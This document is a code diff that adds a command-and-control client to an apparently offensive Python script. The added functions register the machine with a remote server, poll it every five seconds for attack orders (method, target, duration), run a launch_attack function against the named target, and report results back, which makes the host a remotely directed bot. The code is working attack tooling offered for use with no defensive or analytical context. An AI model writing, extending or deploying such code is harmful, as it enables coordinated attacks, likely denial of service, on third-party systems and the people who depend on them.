@@ -385,3 +385,103 @@ def launch_attack(method, target, duration):
         print(f"{method} attack on {target} completed")
     else:
         print(f"Unknown attack method: {method}")
+
+# Server communication functions
+def register_with_server(server_url, client_id, attack_methods):
+    """Register client with the server"""
+    try:
+        response = requests.post(
+            f"{server_url}/register",
+            json={
+                "client_id": client_id,
+                "attack_methods": attack_methods,
+                "status": "online"
+            },
+            timeout=10
+        )
+        return response.status_code == 200
+    except:
+        return False
+
+def get_attack_command(server_url, client_id):
+    """Get attack command from server"""
+    try:
+        response = requests.get(
+            f"{server_url}/command/{client_id}",
+            timeout=5
+        )
+        if response.status_code == 200:
+            return response.json()
+    except:
+        pass
+    return None
+
+def send_attack_result(server_url, client_id, result):
+    """Send attack result to server"""
+    try:
+        response = requests.post(
+            f"{server_url}/result/{client_id}",
+            json=result,
+            timeout=10
+        )
+        return response.status_code == 200
+    except:
+        return False
+
+def client_loop(server_url, client_id):
+    """Main client loop that communicates with server"""
+    # Register with server
+    if not register_with_server(server_url, client_id, list(ATTACK_METHODS.keys())):
+        print("Failed to register with server")
+        return
+    
+    print("Registered with server, waiting for commands...")
+    
+    while True:
+        # Check for attack commands
+        command = get_attack_command(server_url, client_id)
+        if command:
+            print(f"Received command: {command}")
+            
+            # Execute the attack
+            method = command.get("method")
+            target = command.get("target")
+            duration = command.get("duration", 60)
+            
+            if method and target:
+                try:
+                    # Launch the attack
+                    launch_attack(method, target, duration)
+                    
+                    # Send result to server
+                    send_attack_result(server_url, client_id, {
+                        "status": "completed",
+                        "method": method,
+                        "target": target,
+                        "duration": duration
+                    })
+                except Exception as e:
+                    # Send error to server
+                    send_attack_result(server_url, client_id, {
+                        "status": "error",
+                        "method": method,
+                        "target": target,
+                        "duration": duration,
+                        "error": str(e)
+                    })
+            else:
+                print("Invalid command: missing method or target")
+        
+        # Wait before checking again
+        time.sleep(5)
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) != 3:
+        print("Usage: python attack_methods.py <server_url> <client_id>")
+        sys.exit(1)
+    
+    server_url = sys.argv[1]
+    client_id = sys.argv[2]
+    
+    client_loop(server_url, client_id)
